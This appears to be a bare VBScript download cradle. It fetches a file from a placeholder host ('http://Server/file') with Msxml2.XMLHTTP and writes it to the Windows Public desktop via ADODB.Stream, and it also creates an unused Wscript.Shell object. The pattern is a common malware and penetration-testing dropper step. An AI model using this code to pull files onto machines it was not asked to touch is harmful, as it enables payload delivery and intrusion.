Set Post = CreateObject("Msxml2.XMLHTTP")
set Shell = CreateObject("Wscript.Shell")
Post.Open "GET","http://Server/file",0
Post.Send()
set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile "C:\Users\Public\Desktop\test.txt",2
